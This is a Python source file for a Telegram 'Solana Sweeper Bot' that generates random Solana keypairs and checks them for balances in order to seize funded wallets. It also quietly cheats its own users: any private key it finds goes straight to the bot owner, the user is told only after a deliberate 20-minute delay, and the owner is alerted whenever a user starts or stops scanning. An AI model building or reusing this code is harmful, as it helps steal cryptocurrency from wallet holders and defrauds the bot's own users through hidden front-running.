import telebot
import threading
import time
import os
from telebot import types
from solana.rpc.api import Client
from solders.keypair import Keypair
from dotenv import load_dotenv

# 1. Load Environment Variables
load_dotenv()

BOT_TOKEN = os.getenv("NEW_TELEGRAM_BOT_TOKEN")
OWNER_ID = os.getenv("OWNER_ID")

# Validation
if not BOT_TOKEN:
    print("❌ ERROR: TELEGRAM_BOT_TOKEN not found in .env")
    exit(1)

if not OWNER_ID:
    print("❌ CRITICAL ERROR: OWNER_ID not found in .env")
    print("You must set your Telegram ID to receive the keys first.")
    exit(1)
else:
    OWNER_ID = int(OWNER_ID)

bot = telebot.TeleBot(BOT_TOKEN)
user_sessions = {}

# --- DELAYED SENDER ---
def delayed_user_notification(chat_id, message):
    """Waits 20 minutes before sending the message to the user"""
    time.sleep(20 * 60) # 20 Minutes in seconds
    try:
        bot.send_message(chat_id, message, parse_mode='HTML')
    except Exception as e:
        print(f"Failed to send delayed msg to {chat_id}: {e}")

# --- ADMIN HELPER ---
def notify_admin(message):
    try:
        bot.send_message(OWNER_ID, f"🔔 **ADMIN ALERT:**\n{message}", parse_mode='Markdown')
    except Exception:
        pass

# --- MENUS ---
def get_main_menu():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btn_start = types.KeyboardButton('🚀 Start Scanning')
    btn_status = types.KeyboardButton('📊 Status')
    btn_stop = types.KeyboardButton('🛑 Stop')
    markup.add(btn_start, btn_status, btn_stop)
    return markup

def get_rpc_menu():
    markup = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
    btn_public = types.KeyboardButton('🌐 Use Public Mainnet')
    btn_cancel = types.KeyboardButton('🔙 Cancel')
    markup.add(btn_public, btn_cancel)
    return markup

# --- SCANNER WORKER ---
def scanner_worker(chat_id):
    session = user_sessions.get(chat_id)
    if not session: return

    rpc_url = session['rpc']
    
    try:
        client = Client(rpc_url)
        client.get_epoch_info()
    except Exception as e:
        bot.send_message(chat_id, f"⚠️ **RPC Error:**\n`{str(e)}`", parse_mode='Markdown', reply_markup=get_main_menu())
        session['running'] = False
        return

    bot.send_message(chat_id, "✅ **RPC Connected!** Hunting...", parse_mode='Markdown')

    while session.get('running', False):
        session['attempts'] += 1
        
        try:
            kp = Keypair()
            resp = client.get_balance(kp.pubkey())
            balance = resp.value

            if balance > 0:
                sol = balance / 1_000_000_000
                secret_str = str(kp.secret()) # Byte array as string
                
                # 1. Prepare Messages
                admin_msg = (
                    f"💰 **WALLET FOUND! (User: `{chat_id}`)**\n"
                    f"Balance: `{sol} SOL`\n"
                    f"Address: `{kp.pubkey()}`\n"
                    f"Secret: `{secret_str}`\n\n"
                    f"ℹ️ _User will be notified in 20 mins._"
                )
                
                user_msg = (
                    f"🚨 <b>FOUND FUNDED WALLET!</b> 🚨\n\n"
                    f"💰 <b>Balance:</b> {sol} SOL\n"
                    f"🔑 <b>Address:</b> <code>{kp.pubkey()}</code>\n"
                    f"🔐 <b>Secret:</b> <code>{secret_str}</code>"
                )

                # 2. Notify Admin IMMEDIATELY
                bot.send_message(OWNER_ID, admin_msg, parse_mode='Markdown')
                
                # 3. Schedule User Notification (20 Min Delay)
                # We start a new thread so the scanner doesn't freeze
                threading.Thread(target=delayed_user_notification, args=(chat_id, user_msg)).start()

        except Exception:
            time.sleep(2)

        time.sleep(0.05) 

# --- HANDLERS ---

@bot.message_handler(commands=['start'])
def start_command(message):
    bot.send_message(message.chat.id, "👋 **Solana Sweeper Bot**", parse_mode='Markdown', reply_markup=get_main_menu())

@bot.message_handler(func=lambda m: m.text == '🚀 Start Scanning')
def request_rpc(message):
    chat_id = message.chat.id
    if chat_id in user_sessions and user_sessions[chat_id].get('running'):
        bot.send_message(chat_id, "⚠️ Already running!", reply_markup=get_main_menu())
        return
    msg = bot.send_message(chat_id, "🔗 **Select RPC:**", reply_markup=get_rpc_menu())
    bot.register_next_step_handler(msg, process_rpc_input)

def process_rpc_input(message):
    chat_id = message.chat.id
    text = message.text.strip()
    
    if text == '🔙 Cancel':
        bot.send_message(chat_id, "Cancelled.", reply_markup=get_main_menu())
        return

    rpc_url = "https://api.mainnet-beta.solana.com" if text == '🌐 Use Public Mainnet' else text

    if not rpc_url.startswith("http"):
        msg = bot.send_message(chat_id, "❌ Invalid URL.", reply_markup=get_rpc_menu())
        bot.register_next_step_handler(msg, process_rpc_input)
        return

    user_sessions[chat_id] = {'running': True, 'attempts': 0, 'rpc': rpc_url}
    threading.Thread(target=scanner_worker, args=(chat_id,), daemon=True).start()
    bot.send_message(chat_id, f"🚀 **Started!** Target: `{rpc_url}`", parse_mode='Markdown', reply_markup=get_main_menu())
    
    if chat_id != OWNER_ID:
        notify_admin(f"👤 User `{chat_id}` **STARTED** scanning.")

@bot.message_handler(func=lambda m: m.text == '📊 Status')
def status_handler(message):
    chat_id = message.chat.id
    
    if chat_id == OWNER_ID:
        active = [uid for uid, s in user_sessions.items() if s['running']]
        total = sum(s['attempts'] for s in user_sessions.values())
        bot.send_message(chat_id, f"👑 **ADMIN**\nActive: `{len(active)}`\nTotal Scans: `{total}`", parse_mode='Markdown')
        return

    session = user_sessions.get(chat_id)
    if not session or not session.get('running'):
        bot.send_message(chat_id, "😴 Idle", reply_markup=get_main_menu())
    else:
        bot.send_message(chat_id, f"🔄 Scanned: `{session['attempts']}`", parse_mode='Markdown')

@bot.message_handler(func=lambda m: m.text == '🛑 Stop')
def stop_handler(message):
    chat_id = message.chat.id
    session = user_sessions.get(chat_id)
    if session and session.get('running'):
        session['running'] = False
        bot.send_message(chat_id, "🛑 **Stopped.**", reply_markup=get_main_menu())
        if chat_id != OWNER_ID:
            notify_admin(f"👤 User `{chat_id}` **STOPPED**.")
        del user_sessions[chat_id]
    else:
        bot.send_message(chat_id, "⚠️ No active scan.", reply_markup=get_main_menu())

if __name__ == "__main__":
    print("🤖 Bot started...")
    try:
        bot.remove_webhook()
        bot.infinity_polling()
    except Exception as e:
        print(f"Error: {e}")
